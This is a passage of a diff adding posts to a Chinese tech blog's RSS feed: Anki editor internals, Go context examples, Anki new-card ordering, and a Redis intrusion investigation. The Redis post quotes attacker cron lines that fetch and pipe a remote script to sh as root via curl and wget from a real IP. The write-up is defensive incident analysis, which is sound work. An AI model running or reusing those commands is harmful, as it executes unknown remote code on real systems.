+        // no field has been focused yet
+        return;
+    }
+    // type is either &#39;blur&#39; or &#39;key&#39;
+    pycmd(type +
+        &amp;quot;:&amp;quot; +
+        currentFieldOrdinal() +
+        &amp;quot;:&amp;quot; +
+        currentNoteId +
+        &amp;quot;:&amp;quot; +
+        currentField.innerHTML);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时&lt;code&gt;JS&lt;/code&gt;可通过&lt;code&gt;pycmd()&lt;/code&gt;函数向&lt;code&gt;Python&lt;/code&gt;发送事件，事件处理路径：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Bridge.cmd()
+  -&amp;gt; AnkiWebPage._onCmd()
+    -&amp;gt; AnkiWebView._onBridgeCmd()
+      -&amp;gt; 处理domDone事件
+      -&amp;gt; Editor.onBridgeCmd()
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当输入框更新时，&lt;code&gt;Editor.onBridgeCmd()&lt;/code&gt;会收到来自&lt;code&gt;JS&lt;/code&gt;的事件&lt;code&gt;cmd&lt;/code&gt;，其格式类似于：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;key:0:1606804714569:太阳距地距离？
+key:1:1606804714569:1.496*10^8千米
+blur:1:1606804714569:1.496*10^8千米
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;Anki&lt;/code&gt;按照约定的格式进行解析，保存到&lt;code&gt;Editor.note&lt;/code&gt;对象。&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>使用Context实现超时监控</title>
+      <link>https://username.github.io/%E4%BD%BF%E7%94%A8context%E5%AE%9E%E7%8E%B0%E8%B6%85%E6%97%B6%E7%9B%91%E6%8E%A7/</link>
+      <pubDate>Mon, 30 Nov 2020 16:59:49 +0800</pubDate>
+      <guid>https://username.github.io/%E4%BD%BF%E7%94%A8context%E5%AE%9E%E7%8E%B0%E8%B6%85%E6%97%B6%E7%9B%91%E6%8E%A7/</guid>
+      <description>&lt;p&gt;假设需要从注册中心获取某个服务的多个节点，当超过某个时间则返回获取失败的错误信息，例：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// ...
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cancel&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;WithTimeout&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Background&lt;/span&gt;(), &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Second&lt;/span&gt;)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cancel&lt;/span&gt;()
+&lt;span style=&#34;color:#a6e22e&#34;&gt;done&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; make(&lt;span style=&#34;color:#66d9ef&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt;{})
+&lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt;() {
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;rs&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;watcher&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Next&lt;/span&gt;()
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
+        &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Error&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed to watch service: %s, err: %v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;conf&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Conf&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;CometServiceName&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
+        close(&lt;span style=&#34;color:#a6e22e&#34;&gt;done&lt;/span&gt;)
+    }
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Debug&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;service registry result: %+v, len(rs.Service.Nodes): %d&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;rs&lt;/span&gt;, len(&lt;span style=&#34;color:#a6e22e&#34;&gt;rs&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Service&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Nodes&lt;/span&gt;))
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(&lt;span style=&#34;color:#a6e22e&#34;&gt;rs&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Service&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Nodes&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; {
+        close(&lt;span style=&#34;color:#a6e22e&#34;&gt;done&lt;/span&gt;)
+    }
+}()
+&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; {
+&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;done&lt;/span&gt;:
+&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Done&lt;/span&gt;():
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed to fetch nodes due to timeout&amp;#34;&lt;/span&gt;)
+}
+&lt;span style=&#34;color:#75715e&#34;&gt;// ...
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    <item>
+      <title>Anki新卡片顺序</title>
+      <link>https://username.github.io/anki%E6%96%B0%E5%8D%A1%E7%89%87%E9%A1%BA%E5%BA%8F/</link>
+      <pubDate>Mon, 30 Nov 2020 14:20:43 +0800</pubDate>
+      <guid>https://username.github.io/anki%E6%96%B0%E5%8D%A1%E7%89%87%E9%A1%BA%E5%BA%8F/</guid>
+      <description>&lt;pre&gt;&lt;code&gt;Anki版本信息
+-----------
+Tag：2.1.26
+Commit ID: 70784154
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;新卡片顺序什么时候决定的&#34;&gt;新卡片顺序什么时候决定的？&lt;/h2&gt;
+&lt;p&gt;新增卡片时决定的。&lt;/p&gt;
+&lt;h2 id=&#34;新卡片顺序如何决定的&#34;&gt;新卡片顺序如何决定的？&lt;/h2&gt;
+&lt;p&gt;新增&lt;code&gt;Note&lt;/code&gt;的逻辑：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;找到&lt;code&gt;Note&lt;/code&gt;对应的&lt;code&gt;Model&lt;/code&gt;（即&lt;code&gt;Note Type&lt;/code&gt;）的模板&lt;code&gt;Templates&lt;/code&gt;，每个&lt;code&gt;Model&lt;/code&gt;可能有多个&lt;code&gt;Templates&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;获取全局计数器&lt;code&gt;nextPos&lt;/code&gt;加1后的值
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;nextPos&lt;/code&gt;是属于&lt;code&gt;Collection&lt;/code&gt;的全局配置，保存在&lt;code&gt;config&lt;/code&gt;表中&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;nextPos&lt;/code&gt;每次新增卡片会递增1&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;遍历每个&lt;code&gt;Template&lt;/code&gt;，根据&lt;code&gt;Note&lt;/code&gt;、&lt;code&gt;Template&lt;/code&gt;、&lt;code&gt;Deck&lt;/code&gt;等信息生成&lt;code&gt;Card&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Card.due&lt;/code&gt;属性保存新卡片的到期时间，但对于不同类型的卡，该属性的值不同，参考&lt;a href=&#34;https://docs.ankiweb.net/#/browsing?id=card-list&#34;&gt;文档说明&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;新增卡片时为&lt;code&gt;Card.due&lt;/code&gt;赋值
+&lt;ul&gt;
+&lt;li&gt;如果&lt;code&gt;Deck&lt;/code&gt;配置项&lt;code&gt;conf[&amp;quot;new&amp;quot;][&amp;quot;order&amp;quot;]&lt;/code&gt;为&lt;code&gt;NEW_CARDS_DUE&lt;/code&gt;，则使用全局计数器&lt;code&gt;nextPos&lt;/code&gt;的值
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;conf[&amp;quot;new&amp;quot;][&amp;quot;order&amp;quot;]&lt;/code&gt;有两种可能的值，&lt;code&gt;NEW_CARDS_DUE&lt;/code&gt;和&lt;code&gt;NEW_CARDS_RANDOM&lt;/code&gt;，分别对应&lt;code&gt;Deck&lt;/code&gt;配置中&lt;code&gt;Show new cards in order added&lt;/code&gt;和&lt;code&gt;Show new cards in random order&lt;/code&gt;两个配置项，如下图所示：
+&lt;img src=&#34;https://username.github.io/images/deck_config_new_order.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;如果&lt;code&gt;Deck&lt;/code&gt;配置项&lt;code&gt;conf[&amp;quot;new&amp;quot;][&amp;quot;order&amp;quot;]&lt;/code&gt;为&lt;code&gt;NEW_CARDS_RANDOM&lt;/code&gt;则为&lt;code&gt;Card.due&lt;/code&gt;属性计算一个随机值&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;新卡片的顺序值如何查看&#34;&gt;新卡片的顺序值如何查看？&lt;/h2&gt;
+&lt;p&gt;Browser中的&lt;code&gt;Due&lt;/code&gt;字段。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Deck&lt;/code&gt;配置项&lt;code&gt;conf[&amp;quot;new&amp;quot;][&amp;quot;order&amp;quot;]&lt;/code&gt;为&lt;code&gt;NEW_CARDS_DUE&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;新增4张卡片，如下图所示：
+&lt;img src=&#34;https://username.github.io/images/demo_deck_config_new_order.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Deck&lt;/code&gt;配置项&lt;code&gt;conf[&amp;quot;new&amp;quot;][&amp;quot;order&amp;quot;]&lt;/code&gt;为&lt;code&gt;NEW_CARDS_RANDOM&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;新增4张卡片，如下图所示：
+&lt;img src=&#34;https://username.github.io/images/demo_deck_config_new_random.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;</description>
+    </item>
+    <item>
+      <title>使用Context控制多个goroutine</title>
+      <link>https://username.github.io/%E4%BD%BF%E7%94%A8context%E6%8E%A7%E5%88%B6%E5%A4%9A%E4%B8%AAgoroutine/</link>
+      <pubDate>Thu, 19 Nov 2020 11:47:32 +0800</pubDate>
+      <guid>https://username.github.io/%E4%BD%BF%E7%94%A8context%E6%8E%A7%E5%88%B6%E5%A4%9A%E4%B8%AAgoroutine/</guid>
+      <description>&lt;p&gt;&lt;a href=&#34;https://play.golang.org/p/RauyvzGUMHZ&#34;&gt;Play&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; (
+	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;context&amp;#34;&lt;/span&gt;
+	&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;
+)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Foo&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Context&lt;/span&gt;
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;cancel&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;CancelFunc&lt;/span&gt;
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;ch&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Foo&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;r1&lt;/span&gt;() {
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; {
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; {
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ch&lt;/span&gt;:
+			println(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r1 print: &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;)
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Done&lt;/span&gt;():
+			println(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Foo.r1() routine exit&amp;#34;&lt;/span&gt;)
+			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
+		}
+	}
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Foo&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;r2&lt;/span&gt;() {
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; {
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; {
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ch&lt;/span&gt;:
+			println(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r2 print: &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;)
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Done&lt;/span&gt;():
+			println(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Foo.r2() routine exit&amp;#34;&lt;/span&gt;)
+			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
+		}
+	}
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Foo&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;r3&lt;/span&gt;() {
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; {
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;select&lt;/span&gt; {
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ch&lt;/span&gt;:
+			println(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r3 print: &amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;)
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Done&lt;/span&gt;():
+			println(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Foo.r3() routine exit&amp;#34;&lt;/span&gt;)
+			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
+		}
+	}
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cancel&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;WithTimeout&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;context&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Background&lt;/span&gt;(), &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Minute&lt;/span&gt;)
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Foo&lt;/span&gt;{
+		&lt;span style=&#34;color:#a6e22e&#34;&gt;ch&lt;/span&gt;:     make(&lt;span style=&#34;color:#66d9ef&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;),
+		&lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt;:    &lt;span style=&#34;color:#a6e22e&#34;&gt;ctx&lt;/span&gt;,
+		&lt;span style=&#34;color:#a6e22e&#34;&gt;cancel&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;cancel&lt;/span&gt;,
+	}
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;r1&lt;/span&gt;()
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;r2&lt;/span&gt;()
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;r3&lt;/span&gt;()
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; {
+		&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;After&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Millisecond&lt;/span&gt;)
+	}
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;cancel&lt;/span&gt;()
+	&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;After&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Second&lt;/span&gt;)
+	println(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;main routine exit&amp;#34;&lt;/span&gt;)
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+    </item>
+    <item>
+      <title>记一次redis攻击排查</title>
+      <link>https://username.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1redis%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5/</link>
+      <pubDate>Thu, 15 Oct 2020 16:18:14 +0800</pubDate>
+      <guid>https://username.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1redis%E6%94%BB%E5%87%BB%E6%8E%92%E6%9F%A5/</guid>
+      <description>&lt;h2 id=&#34;排查过程&#34;&gt;排查过程&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;开发环境redis key反复丢失&lt;/li&gt;
+&lt;li&gt;启用aof持久化方式，记录每一个写命令，重启redis服务器&lt;/li&gt;
+&lt;li&gt;redis key再次丢失&lt;/li&gt;
+&lt;li&gt;查看aof文件内容&lt;/li&gt;
+&lt;li&gt;排查导致key被删除的命令，del无，出现flushall&lt;/li&gt;
+&lt;li&gt;查看flushall周边命令
+&lt;pre&gt;&lt;code&gt;  $8
+  flushall
+  *3
+  $3
+  set
+  $2
+  r1
+  $51
+
+
+  * * * * * root curl -fsS 94.237.85.89:8080/0|sh
+
+
+  *3
+  $3
+  set
+  $2
+  r2
+  $51
+
+
+  * * * * * root wget -qO- 94.237.85.89:8080/0|sh
+
+
+  *1
+  $8
+  flushall
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;外部客户端连接到了redis执行恶意命令，类似于https://github.com/redis/redis/issues/3594&lt;/li&gt;
+&lt;li&gt;检查crontab列表
+&lt;pre&gt;&lt;code&gt;crontab -l
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;没发现定时任务，检查&lt;a href=&#34;https://manpages.debian.org/stretch/cron/cron.8&#34;&gt;cron&lt;/a&gt;默认读取的目录文件:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ll /etc/cron.d
+total 12
+-rw-r--r--. 1 root root 128 Mar 31  2016 0hourly
+-rw-------  1 root root 235 Nov  6  2016 sysstat
+-rw-r--r--  1 root root 209 Oct 15 12:35 systemdd
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;systemdd&lt;/code&gt;这个文件今天更新过&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;REDIS0009�	redis-ver5.0.5�
+redis-bits�@�ctimeч_used-mem��H�
+                                 aof-preamble���r23
+  
+* * * * * root wget -qO- 94.237.85.89:8080/0|sh
+  
+r13
+  
+* * * * * root curl -fsS 94.237.85.89:8080/0|sh
+  
+��D��6-�
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;乱码中看到了熟悉的“面孔”，果断删除文件。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;检查crontab日志
+&lt;pre&gt;&lt;code&gt;tail -f /var/log/cron
+Oct 15 15:40:01 sophonsitapp13 CROND[648]: (root) CMD (curl -fsS 94.237.85.89:8080/0|sh)
+Oct 15 15:40:01 sophonsitapp13 CROND[647]: (root) CMD (wget -qO- 94.237.85.89:8080/0|sh)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;还在每分钟执行一次，重启进程：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;systemctl start crond.service
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;redis安全加固
+&lt;ul&gt;
+&lt;li&gt;禁用CONFIG、FLUSHDB、FLUSHALL命令&lt;/li&gt;
+&lt;li&gt;换用一个陌生端口&lt;/li&gt;
+&lt;li&gt;加密码（生产环境服务间通讯均是内网环境，所以无需密码）&lt;/li&gt;
+&lt;li&gt;其他参考 &lt;a href=&#34;https://help.aliyun.com/knowledge_detail/37447.html&#34;&gt;https://help.aliyun.com/knowledge_detail/37447.html&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
